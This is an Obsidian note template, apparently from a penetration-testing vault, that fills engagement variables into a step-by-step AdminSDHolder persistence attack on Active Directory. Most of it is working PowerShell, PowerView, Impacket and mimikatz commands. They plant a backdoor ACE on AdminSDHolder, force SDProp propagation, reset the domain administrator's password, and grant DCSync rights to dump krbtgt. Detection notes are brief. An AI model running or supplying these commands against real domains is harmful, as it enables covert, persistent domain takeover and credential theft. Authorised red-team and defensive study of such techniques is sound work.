---
# Attack-specific fields
backdoor_user:
target_protected_group:
acl_permission: GenericAll
sdprop_interval: 60
notes:
---

# AdminSDHolder Abuse

> [!abstract] Attack Summary
> **AdminSDHolder** is a special AD container whose ACL is automatically propagated (by the **SDProp** process every 60 minutes) to all **protected objects** (Domain Admins, Enterprise Admins, Administrators, etc.). If you can write to AdminSDHolder's ACL, you gain **persistent, auto-renewed elevated access** to all protected accounts — surviving even direct ACL removals from individual accounts.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const perms = ["GenericAll","GenericWrite","WriteDACL","ResetPassword","WriteProperty"];
const permOptions = perms.map(p2 => `option(${p2})`).join(',');

dv.table(["Field", "Value"], [
  ["Backdoor User to Grant Rights To", `\`INPUT[text(defaultValue("${p.backdoor_user || b?.username || ''}")):backdoor_user]\``],
  ["Permission to Grant",              `\`INPUT[inlineSelect(defaultValue(${p.acl_permission ?? 'GenericAll'}),${permOptions}):acl_permission]\``],
  ["SDProp Interval (min)",            `\`INPUT[text(defaultValue("${p.sdprop_interval ?? 60}")):sdprop_interval]\``],
]);
```

---

## Step 1 — Understand Protected Objects

> [!info] SDProp runs every 60 minutes and overwrites ACLs on all protected objects with the AdminSDHolder ACL. Protected groups include: Domain Admins, Enterprise Admins, Administrators, Schema Admins, Account Operators, Backup Operators, Print Operators, Server Operators, and their members.

**Windows — Find protected objects**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain = b?.domain ?? "domain.local";
dv.paragraph("```powershell\n# Find objects with AdminCount = 1 (protected by SDProp)\nGet-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount | Select samaccountname,AdminCount\nGet-ADComputer -Filter {AdminCount -eq 1} -Properties AdminCount | Select samaccountname\nGet-ADGroup -Filter {AdminCount -eq 1} -Properties AdminCount | Select samaccountname\n\n# View current AdminSDHolder ACL\nGet-ACL 'AD:CN=AdminSDHolder,CN=System," + domain.split('.').map(x => "DC=" + x).join(',') + "' | Select-Object -ExpandProperty Access\n```");
```

**Windows — ADSearch**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search '(adminCount=1)' --attributes samaccountname,distinguishedname\n```");
```

---

## Step 2 — Modify AdminSDHolder ACL (Requires DA)

**Windows — PowerView**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain       = b?.domain ?? "domain.local";
const domainParts  = domain.split('.').map(x => "DC=" + x).join(',');
const backdoorUser = p?.backdoor_user || "BACKDOOR_USER";
const permission   = p?.acl_permission || "GenericAll";
dv.paragraph("```powershell\n# Add full control (GenericAll) to AdminSDHolder for backdoor user\nAdd-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName '" + backdoorUser + "' -Rights " + permission + " -Verbose\n\n# Verify it was added\nGet-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' | ?{ $_.IdentityReference -match '" + backdoorUser + "' }\n```");
```

**Windows — PowerShell RSAT**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain       = b?.domain ?? "domain.local";
const domainParts  = domain.split('.').map(x => "DC=" + x).join(',');
const backdoorUser = p?.backdoor_user || "BACKDOOR_USER";
dv.paragraph("```powershell\n# Get backdoor user's SID\n$user = Get-ADUser -Identity '" + backdoorUser + "'\n$sid = [System.Security.Principal.SecurityIdentifier] $user.SID\n\n# Create ACE\n$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(\n  $sid,\n  [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,\n  [System.Security.AccessControl.AccessControlType]::Allow\n)\n\n# Get AdminSDHolder and add ACE\n$adminSDHolder = [ADSI]\"LDAP://CN=AdminSDHolder,CN=System," + domainParts + "\"\n$adminSDHolder.ObjectSecurity.AddAccessRule($ace)\n$adminSDHolder.CommitChanges()\nWrite-Host 'ACE added to AdminSDHolder'\n```");
```

**Linux — Impacket dacledit**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain       = b?.domain   ?? "DOMAIN";
const dc_ip        = b?.dc_ip    ?? "DC_IP";
const username     = b?.username ?? "USER";
const password     = b?.password ?? "PASSWORD";
const backdoorUser = p?.backdoor_user || "BACKDOOR_USER";
const permission   = p?.acl_permission || "GenericAll";
const domainParts  = domain.split('.').map(x => "DC=" + x).join(',');
dv.paragraph("```bash\nimpacket-dacledit " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip +
  " -target-dn 'CN=AdminSDHolder,CN=System," + domainParts + "' -principal '" + backdoorUser + "' -action write -rights '" + permission + "'\n```");
```

---

## Step 3 — Trigger SDProp (Force Propagation Now)

> [!info] By default, SDProp runs every 60 minutes. You can force it immediately.

**Windows — Force SDProp**
```dataviewjs
dv.paragraph("```powershell\n# Force SDProp to run immediately (requires DA, run on DC)\nInvoke-ADSDPropagation\n\n# Or via registry modification on DC\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\" /v \"AdminSDProtectFrequency\" /t REG_DWORD /d 1\n\n# Or use ldap_modification with rootDSE\n$rootDSE = [ADSI]'LDAP://RootDSE'\n$rootDSE.Put('fixupInheritance', '1')\n$rootDSE.SetInfo()\n\n# After: wait 1-2 minutes then verify protected users have the new ACE\n```");
```

---

## Step 4 — Verify Propagation

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const backdoorUser = p?.backdoor_user || "BACKDOOR_USER";
dv.paragraph("```powershell\n# Check if backdoor user now has rights on DA account\nGet-ObjectAcl -SamAccountName 'administrator' -ResolveGUIDs | ?{ $_.IdentityReference -match '" + backdoorUser + "' }\n\n# Check rights on Domain Admins group\nGet-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDs | ?{ $_.IdentityReference -match '" + backdoorUser + "' }\n```");
```

---

## Step 5 — Abuse the Backdoor Rights

**With GenericAll — Reset any protected user's password**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain       = b?.domain   ?? "DOMAIN";
const dc_ip        = b?.dc_ip    ?? "DC_IP";
const backdoorUser = p?.backdoor_user || "BACKDOOR_USER";
dv.paragraph("```powershell\n# Reset Domain Admin password (from backdoor user's context)\nSet-DomainUserPassword -Identity administrator -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Domain " + domain + "\n\n# Or with impacket (Linux)\nnet rpc password administrator NewPass123! -U " + domain + "/" + backdoorUser + "%PASSWORD -S " + dc_ip + "\n```");
```

**With WriteDACL — Grant DCSync rights**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain       = b?.domain ?? "DOMAIN";
const backdoorUser = p?.backdoor_user || "BACKDOOR_USER";
dv.paragraph("```powershell\n# Add DCSync rights for backdoor user\nAdd-DomainObjectAcl -TargetIdentity " + domain + " -PrincipalIdentity '" + backdoorUser + "' -Rights DCSync\n\n# Then DCSync\nmimikatz lsadump::dcsync /domain:" + domain + " /user:DOMAIN\\krbtgt\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Modification of AdminSDHolder ACL: **Event 5136** (directory service object modification).
> - SDProp propagation cascade: multiple **Event 5136** events as ACLs are updated on all protected objects.
> - Unusual principals in the ACL on AdminSDHolder — defenders checking AdminSDHolder ACL is a common hardening check.
> - **Cleanup:** Remove the ACE from AdminSDHolder. Note that any protected objects that already received the ACE will need manual cleanup too.

---

## Notes & Results

`INPUT[textarea:notes]`
